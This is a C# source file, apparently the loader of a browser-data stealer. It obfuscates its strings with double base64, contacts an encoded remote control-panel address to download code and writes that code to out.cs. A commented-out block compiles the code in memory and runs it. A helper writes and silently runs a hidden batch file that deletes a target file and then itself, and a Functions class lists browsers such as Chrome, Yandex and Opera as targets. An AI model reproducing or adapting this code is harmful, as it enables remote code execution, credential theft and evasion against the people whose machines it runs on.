using System;
using System.IO;
using System.Linq;

public class Program2
{
    public static string Base64Decode(string base64EncodedData)
    {
        var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
        return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
    }
    public static void ASPDU9123KJA(string path)
    {
        System.IO.StreamWriter textFile;
        textFile = new System.IO.StreamWriter(Base64Decode("dXBkYXRlLmJhdA=="));
        textFile.WriteLine(Base64Decode("QGVjaG8gb2Zm"));
        textFile.WriteLine(Base64Decode("ZGVsICI=") + path + Base64Decode("Ig=="));
        textFile.WriteLine(Base64Decode("ZGVsICUw"));
        textFile.Close();
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
        {
            WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            FileName = Base64Decode("dXBkYXRlLmJhdA==")
        });
    }
    public static void Main()
    {
        try
        {
            var iasd81j23ygasd = System.ServiceModel.ChannelFactory<IPanel>.CreateChannel(new System.ServiceModel.BasicHttpBinding(), new System.ServiceModel.EndpointAddress(Base64Decode(Base64Decode("YUhSMGNEb3ZMekU1TXk0eE1qUXVNVEU1TGpFME1qb3lOakV5TXk4PQ==")) + Base64Decode(Base64Decode("U1ZCaGJtVnM="))));
            var asodoqwpeu45opimbnpkvuger = new AuthPrms { Login = Base64Decode(Base64Decode("Wm05NGIzWnphM2s9")) };

            var asdl81723kad7123kjh9asd7123 = iasd81j23ygasd.BuildCode(asodoqwpeu45opimbnpkvuger);



            
            if (asdl81723kad7123kjh9asd7123.Status == RequestStatus.Success)
            {
                var aslasd81237jads = new System.CodeDom.Compiler.CompilerParameters
                {
                    GenerateExecutable = false,
                    GenerateInMemory = true
                };
                aslasd81237jads.ReferencedAssemblies.Add(Base64Decode(Base64Decode("VTNsemRHVnRMbVJzYkE9PQ==")));
                aslasd81237jads.ReferencedAssemblies.Add(Base64Decode(Base64Decode("VTNsemRHVnRMazFoYm1GblpXMWxiblF1Wkd4cw==")));
                aslasd81237jads.ReferencedAssemblies.Add(Base64Decode(Base64Decode("VTNsemRHVnRMbEoxYm5ScGJXVXVVMlZ5YVdGc2FYcGhkR2x2Ymk1a2JHdz0=")));
                aslasd81237jads.ReferencedAssemblies.Add(Base64Decode(Base64Decode("VTNsemRHVnRMbE5sY25acFkyVk5iMlJsYkM1a2JHdz0=")));
                aslasd81237jads.ReferencedAssemblies.Add(Base64Decode(Base64Decode("VTNsemRHVnRMa2xQTG1Sc2JBPT0=")));
                aslasd81237jads.ReferencedAssemblies.Add(Base64Decode(Base64Decode("VTNsemRHVnRMbEpsWm14bFkzUnBiMjR1Wkd4cw==")));
                aslasd81237jads.ReferencedAssemblies.Add(Base64Decode(Base64Decode("VTNsemRHVnRMa3hwYm5FdVpHeHM=")));
                aslasd81237jads.ReferencedAssemblies.Add(Base64Decode(Base64Decode("VTNsemRHVnRMa052Y21VdVpHeHM=")));
                aslasd81237jads.ReferencedAssemblies.Add(Base64Decode(Base64Decode("VFdsamNtOXpiMlowTGtOVGFHRnljQzVrYkd3PQ==")));
                aslasd81237jads.ReferencedAssemblies.Add(Base64Decode(Base64Decode("VTNsemRHVnRMbFJvY21WaFpHbHVaeTVVWVhOcmN5NWtiR3c9")));

                /* Записываем полученный массив строк с сервера в файл */
                string fileName = "out.cs";
                FileStream aFile = new FileStream(fileName, FileMode.OpenOrCreate);
                StreamWriter sw = new StreamWriter(aFile);
                aFile.Seek(0, SeekOrigin.End);

                for (int i = 0; i < asdl81723kad7123kjh9asd7123.Data.Length; i++)
                    sw.WriteLine(asdl81723kad7123kjh9asd7123.Data[i]);

                sw.Close();
                Console.ReadKey();

                /*
                var prqweqe = new Microsoft.CSharp.CSharpCodeProvider();
                var ladjasd7123kha7sdj1237 = prqweqe.CompileAssemblyFromSource(aslasd81237jads, asdl81723kad7123kjh9asd7123.Data);
                var ZXmxcvhxy1231k23h123 = ladjasd7123kha7sdj1237.CompiledAssembly.GetType(Base64Decode(Base64Decode("VUhKdlozSmhiUT09")));
                var asdjk12378afl0834578j123 = ZXmxcvhxy1231k23h123.GetMethod(Base64Decode(Base64Decode("VFhsRGIyUmw=")), System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
                asdjk12378afl0834578j123.Invoke(null, null);*/
            }
        }
        catch
        {
        }
    }
    [System.ServiceModel.ServiceContract]
    interface IPanel
    {
        [System.ServiceModel.OperationContract]
        SResponse<Functions> Authorizate(AuthPrms prms);
        [System.ServiceModel.OperationContract]
        SResponse<string[]> BuildCode(AuthPrms prms);
    }
    [System.Runtime.Serialization.DataContract(Namespace = "SResponse")]
    public class SResponse<T> where T : class
    {
        [System.Runtime.Serialization.DataMember]
        public RequestStatus Status { get; set; }
        [System.Runtime.Serialization.DataMember]
        public string Message { get; set; }
        [System.Runtime.Serialization.DataMember]
        public T Data { get; set; }
    }
    public enum RequestStatus
    {
        Success = 0,
        Error = 1,
        Proccessing = 2
    }
    [System.Runtime.Serialization.DataContract(Namespace = "Auth")]
    public class AuthPrms
    {
        [System.Runtime.Serialization.DataMember]
        public string Login { get; set; }
        [System.Runtime.Serialization.DataMember]
        public string Password { get; set; }
        [System.Runtime.Serialization.DataMember]
        public string Email { get; set; }
    }
    [System.Runtime.Serialization.DataContract(Namespace = "Func")]
    public class Functions
    {
        [System.Runtime.Serialization.DataMember]
        public bool Chrome { get; set; }
        [System.Runtime.Serialization.DataMember]
        public bool Mozilla { get; set; }
        [System.Runtime.Serialization.DataMember]
        public bool Yandex { get; set; }
        [System.Runtime.Serialization.DataMember]
        public bool Kometa { get; set; }
        [System.Runtime.Serialization.DataMember]
        public bool Amigo { get; set; }
        [System.Runtime.Serialization.DataMember]
        public bool Torch { get; set; }
        [System.Runtime.Serialization.DataMember]
        public bool Orbitum { get; set; }
        [System.Runtime.Serialization.DataMember]
        public bool Opera { get; set; }
    }
}